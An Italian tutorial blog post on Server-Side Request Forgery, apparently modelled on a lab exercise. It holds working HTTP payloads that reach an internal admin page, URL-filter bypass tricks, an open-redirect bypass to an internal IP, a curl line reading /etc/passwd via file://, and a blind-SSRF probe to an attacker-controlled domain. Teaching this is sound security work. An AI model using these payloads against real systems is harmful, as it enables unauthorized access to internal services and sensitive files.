Server Side Request Forgey in the Deep

  • En
 |  Suggerisci modifica

Ciao ragazzi, oggi focus sull’SSRF. Con questa tecnica costringiamo il server a fare richieste dove vogliamo, sia interne che esterne. Il trick classico è puntare ad esempio a localhost/admin per bypassare i controlli, sfruttando la fiducia nelle connessioni locali. Se riusciamo a infiltrarci qui, il sistema è nostro.

Esempio classico di SSRF#

La pagina admin del portale web che stiamo analizzando è blindata. Direttamente da /admin, nessun accesso. Ma c’è un punto debole: la funzione di controllo scorte. Basta un intercept con Burp Suite. Notiamo che la richiesta passa con un parametro sospetto: checkStock.

POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

checkStock=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1

A questo punto, modifico l’URL passato al parametro per puntare a http://localhost/admin e invio la richiesta.

POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

checkStock=http://localhost/admin

Il server risponde con la pagina /admin

HTTP/1.1 200 OK
Content-Type: text/html

<h1>Welcome to the Admin Dashboard</h1>
<p>Here you can manage users, view system logs, and configure server settings.</p>
<p><strong>System Status:</strong> All systems are operational.</p>
<p><strong>Recent Activity:</strong></p>
<ul>
    <li>User "john_doe" logged in at 10:23 AM</li>
    <li>Product "Laptop XYZ" updated at 11:45 AM</li>
    <li>Backup completed successfully at 12:00 PM</li>
</ul>
<p><a href="/admin/logs">View full activity logs</a></p>
<p><a href="/admin/configure-server">Server Configuration</a></p>

Come aggirare le difese comuni#

Le difese contro gli attacchi SSRF sono sempre più sofisticate, ma esistono diverse tecniche per aggirarle, rendendo ancora possibile l’exploit. Qui esploriamo alcuni dei metodi più efficaci per bypassare filtri basati su blacklist e whitelist e ottenere accesso a sistemi interni protetti.

Bypass dei filtri basati su blacklist o whitelist#

Alcune applicazioni tentano di bloccare richieste contenenti host come 127.0.0.1, localhost o altre risorse sensibili. Tuttavia, è possibile aggirare questi filtri con vari metodi. Ad esempio: 127.0.0.1 può essere scritto come 0x7f000001 (in esadecimale) oppure 0177.0000.0001 (in notazione ottale). I filtri whitelist invece permettono solo URL specifici, ma esistono diversi modi per aggirarli. Ad esempio, si può inserire una combinazione di credenziali prima del nome host consentito, come in https://trusted.com:password@attacker-host, per ingannare il controllo. Un altro metodo è sfruttare il frammento URL, usando il carattere # per nascondere l’host effettivo, ad esempio: https://attacker-host#trusted.com. Anche la creazione di sottodomini controllati può essere efficace, come in trusted.com.attacker.io. Anche l’uso della doppia codifica può confondere il parser dell’applicazione, rendendo difficile distinguere un URL legittimo da uno manipolato.

Risorsa Utile: URL Validation Bypass Cheat Sheet: La URL Validation Bypass Cheat Sheet di PortSwigger è una risorsa essenziale per scoprire e sfruttare vulnerabilità SSRF. Contiene metodi per aggirare i controlli di validazione degli URL, come encoding, formati IP alternativi e open redirection, rendendo più semplice il superamento dei filtri di sicurezza.

Bypass SSRF tramite Open Redirection#

Talvolta, i filtri anti-SSRF possono essere aggirati sfruttando vulnerabilità di open redirection. In questi casi, l’applicazione consente solo URL specifici, ma segue automaticamente i reindirizzamenti, permettendo di raggiungere indirizzi interni altrimenti inaccessibili.

Ad esempio, supponiamo che l’app accetti solo URL provenienti da https://trusted-shop.com. Tuttavia, la funzionalità di reindirizzamento del sito può essere sfruttata per raggiungere l’interfaccia amministrativa interna:

POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 145

checkStock=https://trusted-shop.com/redirect?target=http://192.168.0.10:8080/admin

In questo esempio, l’app verifica che l’URL inizi con il dominio consentito, ma segue poi il reindirizzamento verso l’IP interno. Così, l’attaccante riesce a raggiungere l’interfaccia admin senza violare direttamente il filtro impostato.

Sfruttare vulnerabilità di open redirection è particolarmente efficace quando i filtri sono rigidi ma l’applicazione non limita i reindirizzamenti. Per questo, è fondamentale monitorare attentamente sia i controlli sugli URL sia le funzionalità di redirect implementate.

Protocol Bypass#

Alcuni server potrebbero limitarsi a determinate URL whitelisted, ma si potrebbero aggirare usando protocolli particolari. Un esempio con file:// per ottenere un file sensibile, come /etc/passwd:

curl -X GET "http://target.com/ssrf?url=file:///etc/passwd"

L’uso del protocollo file:// indirizza il server a tentare di accedere a file locali sensibili sul sistema.

Blind SSRF#

Le vulnerabilità di tipo Blind SSRF si verificano quando un’applicazione può essere indotta a inviare una richiesta HTTP a un URL specificato dall’attaccante, ma la risposta di questa richiesta non viene restituita all’utente. Sebbene più difficili da sfruttare rispetto alle SSRF tradizionali, possono comunque portare a esecuzione remota di codice o altre compromissioni.

Ad esempio, un attaccante può verificare la presenza di una vulnerabilità Blind SSRF utilizzando un dominio controllato:

POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 145

checkStock=http://attacker-domain.com/ssrf-test

Se il server remoto effettua una richiesta al dominio indicato, l’attaccante lo rileverà nei log del proprio server, confermando la vulnerabilità. Da qui, è possibile procedere con payload progettati per individuare vulnerabilità note o addirittura ottenere esecuzione remota di codice sfruttando falle come Shellshock.

Le vulnerabilità Blind SSRF si identificano spesso tramite tecniche out-of-band (OAST), come quelle offerte da strumenti come Burp Collaborator, che generano domini unici per rilevare richieste in uscita dall’applicazione. Questo approccio permette di scoprire vulnerabilità anche quando il server non restituisce alcuna evidenza diretta della richiesta.
